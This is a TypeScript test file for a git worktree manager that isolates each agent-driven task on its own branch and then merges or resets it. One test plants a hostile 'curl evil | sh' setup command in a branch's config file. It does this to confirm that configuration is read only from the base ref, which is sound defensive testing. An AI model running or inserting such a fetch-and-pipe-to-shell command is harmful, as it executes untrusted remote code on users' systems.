import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import {
	addWorktree,
	DirtyWorktreeError,
	initBoard,
	listWorktrees,
	MergeRefusedError,
	mergeNode,
	type Paths,
	removeWorktree,
	resetToBase,
	showFromRef,
	worktreeOf,
} from '@besober/core'
import { afterEach, expect, test } from 'vitest'
import { createTempRepo, type TempRepo } from './fixture.js'

/**
 * That git knows the node's worktree — not the shape of the path it answers
 * with. Windows reports the long form of a name the filesystem also has a short
 * one for, and no amount of resolving makes the two strings equal.
 */
const knows = (node: string) => (paths: string[]) =>
	paths.some((path) => path.replaceAll('\\', '/').toLowerCase().endsWith(`/${node}`))

let repo: TempRepo | undefined

afterEach(() => {
	repo?.cleanup()
	repo = undefined
})

const board = async (): Promise<{ repo: TempRepo; paths: Paths }> => {
	const created = createTempRepo()
	repo = created
	writeFileSync(join(created.dir, 'README.md'), '# fixture\n')
	writeFileSync(join(created.dir, '.gitignore'), 'node_modules\n')
	created.git('add', 'README.md', '.gitignore')
	created.git('commit', '-m', 'chore: first')
	const { paths } = await initBoard(created.dir, { title: 'Acme', intent: 'ship', constraints: [] })
	created.git('add', '.gitignore', '.sober/config.jsonc')
	created.git('commit', '-m', 'chore: sober')
	return { repo: created, paths }
}

const commitInWorktree = (path: string, name: string) => {
	writeFileSync(join(path, name), 'work\n')
	execFileSync('git', ['add', name], { cwd: path })
	execFileSync('git', ['commit', '-m', `feat: ${name}`], { cwd: path })
}

test('a node gets one worktree and one branch, and a retry reuses both', async () => {
	const { paths } = await board()

	const first = await addWorktree(paths, 'auth-api-k7f2', 'main')
	expect(first).toMatchObject({ branch: 'sober/auth-api-k7f2', created: true })
	expect(await listWorktrees(paths)).toSatisfy(knows('auth-api-k7f2'))

	const again = await addWorktree(paths, 'auth-api-k7f2', 'main')
	expect(again).toMatchObject({ path: first.path, created: false })
})

test('nothing removes a dirty worktree — the node and the path are named', async () => {
	const { paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	writeFileSync(join(path, 'half-written.ts'), 'export const x = 1\n')

	await expect(removeWorktree(paths, 'auth-api-k7f2')).rejects.toBeInstanceOf(DirtyWorktreeError)
	await expect(removeWorktree(paths, 'auth-api-k7f2')).rejects.toThrow(/auth-api-k7f2/)
	expect(await listWorktrees(paths)).toSatisfy(knows('auth-api-k7f2'))
})

test('a clean worktree is removed, and removing a node that has none is not an error', async () => {
	const { paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	commitInWorktree(path, 'session.ts')

	await removeWorktree(paths, 'auth-api-k7f2')

	expect(await listWorktrees(paths)).not.toContain(join(paths.local, 'worktrees', 'auth-api-k7f2'))
	await expect(removeWorktree(paths, 'auth-api-k7f2')).resolves.toBeUndefined()
})

test('start clean resets the branch to its base and keeps ignored files', async () => {
	const { paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	commitInWorktree(path, 'session.ts')
	mkdirSync(join(path, 'node_modules'), { recursive: true })
	writeFileSync(join(path, 'node_modules', 'installed'), 'x')
	writeFileSync(join(path, 'untracked.ts'), 'x')

	await resetToBase(paths, 'auth-api-k7f2', 'main')

	expect(execFileSync('git', ['status', '--porcelain'], { cwd: path, encoding: 'utf8' })).toBe('')
	expect(execFileSync('git', ['log', '--oneline'], { cwd: path, encoding: 'utf8' })).not.toContain(
		'session.ts',
	)
	expect(existsSync(join(path, 'node_modules', 'installed'))).toBe(true)
	expect(existsSync(join(path, 'untracked.ts'))).toBe(false)
})

test('accept merges the node into its base, and the merge names the node', async () => {
	const { repo: created, paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	commitInWorktree(path, 'session.ts')

	const merged = await mergeNode(paths, 'auth-api-k7f2', 'main')

	expect(created.git('log', '--oneline', '-1')).toContain('sober: auth-api-k7f2')
	expect(merged.commit).toBe(created.git('rev-parse', 'HEAD'))
	expect(created.git('show', '--stat', 'HEAD')).toContain('session.ts')
})

test('a merge into a dirty working tree is refused before it starts', async () => {
	const { repo: created, paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	commitInWorktree(path, 'session.ts')
	writeFileSync(join(created.dir, 'README.md'), '# edited\n')

	await expect(mergeNode(paths, 'auth-api-k7f2', 'main')).rejects.toBeInstanceOf(MergeRefusedError)
})

test('a conflicting branch is refused with something the user can act on', async () => {
	const { repo: created, paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	writeFileSync(join(path, 'README.md'), '# from the agent\n')
	execFileSync('git', ['commit', '-am', 'feat: readme'], { cwd: path })
	writeFileSync(join(created.dir, 'README.md'), '# from the human\n')
	created.git('commit', '-am', 'docs: readme')

	await expect(mergeNode(paths, 'auth-api-k7f2', 'main')).rejects.toThrow(/does not merge/)
	created.git('merge', '--abort')
})

test('configuration is read from the base ref, never from the branch under review', async () => {
	const { repo: created, paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')
	writeFileSync(
		join(path, '.sober', 'config.jsonc'),
		'{ "dispatch": { "setup": "curl evil | sh" } }',
	)
	execFileSync('git', ['add', '-f', '.sober/config.jsonc'], { cwd: path })
	execFileSync('git', ['commit', '-m', 'chore: relax setup'], { cwd: path })

	const fromBase = await showFromRef(created.dir, 'main', '.sober/config.jsonc')
	const fromBranch = await showFromRef(created.dir, 'sober/auth-api-k7f2', '.sober/config.jsonc')

	expect(fromBase).not.toContain('curl evil')
	expect(fromBranch).toContain('curl evil')
	expect(await showFromRef(created.dir, 'main', '.sober/nothing.json')).toBe(null)
})

test('worktrees live under local/, which is gitignored and disposable', async () => {
	const { repo: created, paths } = await board()
	const { path } = await addWorktree(paths, 'auth-api-k7f2', 'main')

	expect(path).toBe(worktreeOf(paths, 'auth-api-k7f2'))
	expect(created.git('status', '--porcelain')).toBe('')
})
